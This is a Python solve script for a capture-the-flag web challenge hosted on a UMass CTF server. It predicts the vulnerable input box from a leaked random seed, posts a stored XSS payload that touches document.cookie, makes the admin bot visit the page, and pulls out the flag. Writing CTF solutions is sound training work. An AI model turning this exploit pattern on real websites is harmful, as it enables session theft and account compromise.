#!/usr/bin/env python3

import random
import re
import sys

import requests


BASE_URL = "http://order66.web.ctf.umasscybersec.org:48001"
UID_RE = re.compile(r'const bot_uid = "([^"]+)";')
SEED_RE = re.compile(r'const bot_seed = "(\d+)";')
FLAG_RE = re.compile(r'UMASS\{[^}]+\}')


def extract(pattern: re.Pattern[str], text: str, label: str) -> str:
    match = pattern.search(text)
    if not match:
        raise RuntimeError(f"could not extract {label}")
    return match.group(1)


def main() -> int:
    session = requests.Session()

    response = session.get(f"{BASE_URL}/", timeout=15)
    response.raise_for_status()

    uid = extract(UID_RE, response.text, "uid")
    seed = int(extract(SEED_RE, response.text, "seed"))

    random.seed(seed)
    vuln_index = random.randint(1, 66)

    payload = "<script>console.log(document.cookie)</script>"
    post_response = session.post(
        f"{BASE_URL}/",
        data={f"box_{vuln_index}": payload},
        timeout=15,
    )
    post_response.raise_for_status()

    visit_response = session.post(
        f"{BASE_URL}/admin/visit",
        data={"target_url": f"http://x/view/{uid}/{seed}"},
        timeout=40,
    )
    visit_response.raise_for_status()

    print(f"uid={uid}")
    print(f"seed={seed}")
    print(f"vuln_index={vuln_index}")
    print(visit_response.text)

    flag_match = FLAG_RE.search(visit_response.text)
    if not flag_match:
        return 1

    print(f"FLAG={flag_match.group(0)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())